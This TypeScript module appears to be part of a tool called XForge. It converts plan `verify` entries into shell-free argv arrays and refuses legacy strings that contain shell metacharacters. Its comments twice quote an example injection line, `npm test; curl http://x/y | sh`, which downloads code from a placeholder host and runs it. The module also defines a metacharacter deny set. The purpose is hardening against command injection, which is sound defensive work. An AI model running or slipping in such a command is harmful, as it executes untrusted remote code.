import type { WorkPackage } from '../../types.js';

/**
 * Turning a plan's `verify` declaration into something that can be executed without an interpreter.
 *
 * The single-string form used to be the only form, and it reached `/bin/sh -c` intact -- a plan line
 * reading `verify: ["npm test; curl http://x/y | sh"]` was arbitrary command execution whose only
 * speed bump was an approval diff where a trailing `;` is easy to miss. The argv form removes the
 * interpreter rather than sanitising its input, and the string form survives only where it means the
 * same thing with and without a shell.
 *
 * Separated from the resolver because it is a pure translation: text in, argv and a label out, with
 * no filesystem and no Change. Everything here is decidable by reading the plan.
 */

/**
 * A `verify` entry as it appears in `work-packages.yaml`: an argv array, or the deprecated
 * single-string form.
 *
 * The string form used to be the only form, and `workPackageVerificationGates` turned it into a Gate
 * with `shell: true`, so the whole string reached `/bin/sh -c` at the next `xforge check` past
 * Apply. Nothing upstream constrained it: the plan schema said "string, 1-4096 chars"; the
 * synthesized Gate is built in code and never schema-validated; `xforge/changes/**` is deliberately
 * outside the shipped `protected-files` policy because lifecycle Skills write Change content there;
 * and `core/lockfile.ts` digests Scaffold resources, not Change files. So a plan line reading
 * `verify: ["npm test; curl http://x/y | sh"]` was arbitrary command execution with a Stage
 * transition — an approval diff where a trailing `;` is easy to miss — as its only speed bump.
 *
 * The argv form removes the interpreter instead of trying to sanitize its input: `spawn(argv[0],
 * argv.slice(1), { shell: false })` cannot compose commands, redirect, or substitute, whatever the
 * plan says. That makes `verify` structured data rather than a program in another language.
 *
 * `types.ts` still declares `WorkPackage.verify` as `string[]`; the widening lives here because this
 * module is the only reader of the field (`commands/check.ts` consumes the rendered label, not the
 * entry). See `verifyEntries` for the single cast that spans the gap.
 */
type VerifyEntry = string | string[];

export interface NormalizedVerify {
  /** What actually gets spawned. Empty when `problem` is set — such an entry must never run. */
  argv: string[];
  /** The rendering used in diagnostics, CLI output, and Evidence attribution. */
  label: string;
  /**
   * Strings a delivery may put in `validation[].command` to name this entry.
   *
   * `work-package-delivery.schema.json` types that field as a *string*, so an argv entry has to be
   * rendered to be recorded, and there is more than one obvious rendering. Accepting the shell-safe
   * label, the plain space-join, and the JSON array spares a Worker from guessing XForge's quoting
   * style. It weakens nothing: every accepted form is derived from the plan the control plane
   * already holds, so this stays an exact match against the declared command list.
   */
  accepted: string[];
  legacy: boolean;
  /** Why this entry cannot be run at all, if so. */
  problem: string | null;
}

/**
 * Characters that make a legacy string mean something to a shell beyond "run this program".
 *
 * A string containing any of these unquoted is refused rather than reinterpreted: `npm test; curl |
 * sh` parsed as a single argv would silently become a different, harmless command, which hides an
 * author's intent (or an attacker's) instead of reporting it.
 */
const LEGACY_VERIFY_FORBIDDEN = new Set([';', '|', '&', '<', '>', '(', ')', '`', '$', '{', '}', '*', '?', '[', ']', '~', '#', '!']);

/**
 * Splits a deprecated `verify` string into argv, or explains why it cannot be split safely.
 *
 * Deliberately not a shell parser. Words are separated by spaces and tabs; single and double quotes
 * group without expanding anything; there is no escape processing at all, because a backslash is a
 * path separator on Windows (`C:\...\node.exe`) far more often than an escape in a plan file, and
 * no metacharacter can be smuggled through one anyway — the forbidden set is rejected wherever it
 * appears unquoted, escaped or not. `$` and a backtick are refused even inside double quotes, where
 * a shell would expand them and this parser would not: that difference in meaning is exactly what
 * must not be guessed at.
 */
function parseLegacyVerify(command: string): { argv: string[]; problem: string | null } {
  const argv: string[] = [];
  let token = '';
  let started = false;
  let quote: '"' | "'" | null = null;
  for (const character of command) {
    if (character === '\n' || character === '\r' || (character < ' ' && character !== '\t')) {
      return { argv: [], problem: 'contains a newline or control character' };
    }
    if (quote === null && (character === ' ' || character === '\t')) {
      if (started) { argv.push(token); token = ''; started = false; }
      continue;
    }
    if (quote === null && (character === '"' || character === "'")) { quote = character; started = true; continue; }
    if (quote !== null && character === quote) { quote = null; continue; }
    if (quote === null && LEGACY_VERIFY_FORBIDDEN.has(character)) {
      return { argv: [], problem: `contains the unquoted shell metacharacter ${JSON.stringify(character)}` };
    }
    if (quote === '"' && (character === '$' || character === '`')) {
      return { argv: [], problem: `contains ${JSON.stringify(character)} inside double quotes, which a shell would expand and XForge would not` };
    }
    token += character;
    started = true;
  }
  if (quote !== null) return { argv: [], problem: 'has an unterminated quote' };
  if (started) argv.push(token);
  if (!argv[0]) return { argv: [], problem: 'is empty' };
  return { argv, problem: null };
}

/** Tokens that survive a shell unquoted, so a label built from them can be pasted into a terminal. */
const LABEL_SAFE_TOKEN = /^[A-Za-z0-9_@%+=:,./-]+$/;

export function shellLabel(argv: string[]): string {
  return argv
    .map((token) => (LABEL_SAFE_TOKEN.test(token) ? token : `'${token.split("'").join("'\\''")}'`))
    .join(' ');
}

function normalizeVerifyEntry(entry: VerifyEntry): NormalizedVerify {
  if (Array.isArray(entry)) {
    if (!entry.length || !entry[0]) return { argv: [], label: JSON.stringify(entry), accepted: [], legacy: false, problem: 'is an empty argv array' };
    const label = shellLabel(entry);
    return { argv: [...entry], label, accepted: [...new Set([label, entry.join(' '), JSON.stringify(entry)])], legacy: false, problem: null };
  }
  const parsed = parseLegacyVerify(entry);
  /* The original string stays the label and the primary accepted form, so a plan and a delivery
     written before the argv form existed still agree with each other exactly. */
  return {
    argv: parsed.argv,
    label: entry,
    accepted: parsed.problem ? [] : [...new Set([entry, shellLabel(parsed.argv), parsed.argv.join(' ')])],
    legacy: true,
    problem: parsed.problem,
  };
}

/**
 * The one place the on-disk `verify` shape is reconciled with `types.ts`'s `string[]` declaration.
 *
 * Kept as a named cast rather than spread across call sites so the migration has a single seam to
 * delete when `WorkPackage.verify` is retyped and the legacy string form is dropped.
 */
function verifyEntries(workPackage: WorkPackage): VerifyEntry[] {
  return workPackage.verify as unknown as VerifyEntry[];
}

export function normalizeVerify(workPackage: WorkPackage): NormalizedVerify[] {
  return verifyEntries(workPackage).map(normalizeVerifyEntry);
}
